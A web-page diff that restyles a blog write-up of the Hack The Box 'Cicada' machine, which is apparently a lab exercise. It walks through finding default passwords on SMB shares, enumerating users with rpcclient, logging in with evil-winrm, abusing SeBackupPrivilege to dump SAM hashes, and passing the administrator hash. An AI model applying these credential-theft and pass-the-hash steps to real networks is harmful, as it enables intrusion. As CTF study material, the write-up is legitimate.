@@ -1,1 +1,141 @@
-<html><head><meta charset="utf-8"></head><body><figure class="image"><img style="aspect-ratio:1309/144;" src="../img/posts/2024-09-29-Cicada(HTB)/01-638eaea98f.png" width="1309" height="144"></figure><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Shell as emily.oscars</u></strong></span></p><p>&nbsp;</p><p>No webserver so just AD enumeration</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:892/517;" src="../img/posts/2024-09-29-Cicada(HTB)/02-2759f2296f.png" width="892" height="517"></figure><p>&nbsp;</p><p>&nbsp;</p><p>THe HR drive contains a welcome letter which has a default password</p><p>Cicada$M6Corpb*@Lp#nZp!8</p><p>&nbsp;</p><p>We can get usernames with rpcclient and the domain SID provided by enum4linux</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:520/126;" src="../img/posts/2024-09-29-Cicada(HTB)/03-1c93ebc9af.png" width="520" height="126"></figure><p>&nbsp;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:657/413;" src="../img/posts/2024-09-29-Cicada(HTB)/04-335e7a82ec.png" width="657" height="413"></figure><p><br>&nbsp;lookupsids &lt;sid&gt;</p><p>&nbsp;</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:581/87;" src="../img/posts/2024-09-29-Cicada(HTB)/05-ba682e45da.png" width="581" height="87"></figure><p>&nbsp;</p><p>valid user is emily.oscars but the password doesnt work</p><p>&nbsp;</p><p>Guessing random sids we can get more users</p><p>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1100<br>S-1-5-21-917908876-1423158569-3159038727-1100 *unknown*\*unknown* (8)<br>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1101<br>S-1-5-21-917908876-1423158569-3159038727-1101 CICADA\DnsAdmins (4)<br>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1102<br>S-1-5-21-917908876-1423158569-3159038727-1102 CICADA\DnsUpdateProxy (2)<br>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1103<br>S-1-5-21-917908876-1423158569-3159038727-1103 CICADA\Groups (2)<br>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1104<br>S-1-5-21-917908876-1423158569-3159038727-1104 CICADA\john.smoulder (1)<br>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1105<br>S-1-5-21-917908876-1423158569-3159038727-1105 CICADA\sarah.dantelia (1)<br>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1106<br>S-1-5-21-917908876-1423158569-3159038727-1106 CICADA\michael.wrightson (1)<br>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1107<br>&nbsp;</p><p>Users found</p><p>michael.wrightson<br>sarah.dantelia<br>john.smoulder<br>emily.oscars</p><p>&nbsp;</p><p>Michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1105/260;" src="../img/posts/2024-09-29-Cicada(HTB)/06-2892550eb0.png" width="1105" height="260"></figure><p>&nbsp;</p><p>&nbsp;</p><p>&nbsp;</p><p>Cant remote in just yet so I was seeing if there is any other users and we find another one with a password.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:1268/332;" src="../img/posts/2024-09-29-Cicada(HTB)/07-177b1fb04e.png" width="1268" height="332"></figure><p>&nbsp;</p><p>david.orelious:aRt$Lp#7t*VQ!3</p><p>&nbsp;</p><p>Still cant remote into the machine but our new user david can access the dev share.</p><p>&nbsp;</p><p>Contains a file with a new password Q!3@Lp#M6b*7t*Vt</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:826/555;" src="../img/posts/2024-09-29-Cicada(HTB)/08-e68e17c310.png" width="826" height="555"></figure><p>&nbsp;</p><p>This is the password for emily.oscars, we can remote in and get user flag.</p><p><code>evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'</code><br>&nbsp;</p><p>&nbsp;</p><p><span class="text-huge" style="color:hsl(180, 75%, 60%);"><strong><u>Privilege Escalation to admin</u></strong></span></p><p>&nbsp;</p><p>SeBackupPrivilege is enabled so we can use this to copy root flag or dump ntds.dit/SAM</p><p>&nbsp;</p><p>Need to upload/import both of these files then we can exploit our privileges</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:236/46;" src="../img/posts/2024-09-29-Cicada(HTB)/09-b0b09cdae9.png" width="236" height="46"></figure><figure class="image image-style-block-align-left"><img style="aspect-ratio:1182/91;" src="../img/posts/2024-09-29-Cicada(HTB)/10-97ee83d991.png" width="1182" height="91"></figure><p>&nbsp;</p><p>&nbsp;</p><p>We could have stopped there but I wanted to compromise the domain/admin account so I dumped the sam/system hashes.</p><figure class="image image-style-block-align-left"><img style="aspect-ratio:903/210;" src="../img/posts/2024-09-29-Cicada(HTB)/11-415db7de5c.png" width="903" height="210"></figure><p>&nbsp;</p><p>administrator:2b87e7c93a3e8a0ea4a581937016f341</p><p>&nbsp;</p><p><code>evil-winrm -i 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341</code></p><figure class="image image-style-block-align-left"><img style="aspect-ratio:687/254;" src="../img/posts/2024-09-29-Cicada(HTB)/12-227da2677c.png" width="687" height="254"></figure><p>&nbsp;</p><p>&nbsp;</p><p>Pretty easy machine but I did learn something new about enumerating users in RPC client.</p></body></html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <title>HTB: Cicada | HackWithJordan</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="../assets/css/syntax.css">
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+            box-sizing: border-box;
+        }
+
+        .post {
+            width: 100%;
+            max-width: 900px;
+        }
+
+        .terminal {
+            background: #98AFC7;
+            padding: 15px;
+            border-radius: 5px;
+            overflow-x: auto;
+            max-width: 100%;
+            white-space: pre-wrap;
+            word-break: break-word;
+            font-family: monospace;
+            margin: 15px 0;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin: 15px 0;
+            display: block;
+        }
+
+        p {
+            margin: 15px 0;
+            line-height: 1.5;
+            overflow-wrap: anywhere;
+        }
+
+        code {
+            overflow-wrap: anywhere;
+        }
+    </style>
+</head>
+<body>
+
+    <article class="post">
+        <header style="display: flex; align-items: center; gap: 20px;">
+            <img src="../img/posts/2024-09-29-Cicada(HTB)/01-638eaea98f.png" alt="HTB: Cicada cover" style="height: 80px; border-radius: 4px;">
+            <div>
+                <h1 style="margin: 0;">HTB: Cicada</h1>
+                <div class="post-meta">March 15, 2025 &bull; HTB</div>
+            </div>
+        </header>
+
+        <img alt="Screenshot 1" height="144" src="../img/posts/2024-09-29-Cicada(HTB)/01-638eaea98f.png" style="aspect-ratio:1309/144;" width="1309"/>
+
+        <h1 style="color:red;">Shell as emily.oscars</h1>
+
+        <p>No webserver so just AD enumeration</p>
+
+        <img alt="Screenshot 2" height="517" src="../img/posts/2024-09-29-Cicada(HTB)/02-2759f2296f.png" style="aspect-ratio:892/517;" width="892"/>
+
+        <p>THe HR drive contains a welcome letter which has a default password</p>
+
+        <p>Cicada$M6Corpb*@Lp#nZp!8</p>
+
+        <p>We can get usernames with rpcclient and the domain SID provided by enum4linux</p>
+
+        <img alt="Screenshot 3" height="126" src="../img/posts/2024-09-29-Cicada(HTB)/03-1c93ebc9af.png" style="aspect-ratio:520/126;" width="520"/>
+
+        <img alt="Screenshot 4" height="413" src="../img/posts/2024-09-29-Cicada(HTB)/04-335e7a82ec.png" style="aspect-ratio:657/413;" width="657"/>
+
+        <p><br/> lookupsids &lt;sid&gt;</p>
+
+        <img alt="Screenshot 5" height="87" src="../img/posts/2024-09-29-Cicada(HTB)/05-ba682e45da.png" style="aspect-ratio:581/87;" width="581"/>
+
+        <p>valid user is emily.oscars but the password doesnt work</p>
+
+        <p>Guessing random sids we can get more users</p>
+
+        <p>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1100<br/>S-1-5-21-917908876-1423158569-3159038727-1100 *unknown*\*unknown* (8)<br/>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1101<br/>S-1-5-21-917908876-1423158569-3159038727-1101 CICADA\DnsAdmins (4)<br/>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1102<br/>S-1-5-21-917908876-1423158569-3159038727-1102 CICADA\DnsUpdateProxy (2)<br/>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1103<br/>S-1-5-21-917908876-1423158569-3159038727-1103 CICADA\Groups (2)<br/>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1104<br/>S-1-5-21-917908876-1423158569-3159038727-1104 CICADA\john.smoulder (1)<br/>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1105<br/>S-1-5-21-917908876-1423158569-3159038727-1105 CICADA\sarah.dantelia (1)<br/>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1106<br/>S-1-5-21-917908876-1423158569-3159038727-1106 CICADA\michael.wrightson (1)<br/>rpcclient $&gt; lookupsids S-1-5-21-917908876-1423158569-3159038727-1107<br/> </p>
+
+        <p>Users found</p>
+
+        <p>michael.wrightson<br/>sarah.dantelia<br/>john.smoulder<br/>emily.oscars</p>
+
+        <p>Michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8</p>
+
+        <img alt="Screenshot 6" height="260" src="../img/posts/2024-09-29-Cicada(HTB)/06-2892550eb0.png" style="aspect-ratio:1105/260;" width="1105"/>
+
+        <p>Cant remote in just yet so I was seeing if there is any other users and we find another one with a password.</p>
+
+        <img alt="Screenshot 7" height="332" src="../img/posts/2024-09-29-Cicada(HTB)/07-177b1fb04e.png" style="aspect-ratio:1268/332;" width="1268"/>
+
+        <p>david.orelious:aRt$Lp#7t*VQ!3</p>
+
+        <p>Still cant remote into the machine but our new user david can access the dev share.</p>
+
+        <p>Contains a file with a new password Q!3@Lp#M6b*7t*Vt</p>
+
+        <img alt="Screenshot 8" height="555" src="../img/posts/2024-09-29-Cicada(HTB)/08-e68e17c310.png" style="aspect-ratio:826/555;" width="826"/>
+
+        <p>This is the password for emily.oscars, we can remote in and get user flag.</p>
+
+        <pre class="terminal"><code>evil-winrm -i 10.10.11.35 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'</code></pre>
+
+        <h1 style="color:red;">Privilege Escalation to admin</h1>
+
+        <p>SeBackupPrivilege is enabled so we can use this to copy root flag or dump ntds.dit/SAM</p>
+
+        <p>Need to upload/import both of these files then we can exploit our privileges</p>
+
+        <img alt="Screenshot 9" height="46" src="../img/posts/2024-09-29-Cicada(HTB)/09-b0b09cdae9.png" style="aspect-ratio:236/46;" width="236"/>
+
+        <img alt="Screenshot 10" height="91" src="../img/posts/2024-09-29-Cicada(HTB)/10-97ee83d991.png" style="aspect-ratio:1182/91;" width="1182"/>
+
+        <p>We could have stopped there but I wanted to compromise the domain/admin account so I dumped the sam/system hashes.</p>
+
+        <img alt="Screenshot 11" height="210" src="../img/posts/2024-09-29-Cicada(HTB)/11-415db7de5c.png" style="aspect-ratio:903/210;" width="903"/>
+
+        <p>administrator:2b87e7c93a3e8a0ea4a581937016f341</p>
+
+        <pre class="terminal"><code>evil-winrm -i 10.10.11.35 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341</code></pre>
+
+        <img alt="Screenshot 12" height="254" src="../img/posts/2024-09-29-Cicada(HTB)/12-227da2677c.png" style="aspect-ratio:687/254;" width="687"/>
+
+        <p>Pretty easy machine but I did learn something new about enumerating users in RPC client.</p>
+    </article>
+
+</body>
+</html>
